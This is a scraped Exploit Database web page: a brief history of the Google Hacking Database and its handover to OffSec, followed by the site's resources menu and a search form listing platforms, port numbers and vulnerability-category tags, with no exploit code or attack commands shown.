Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


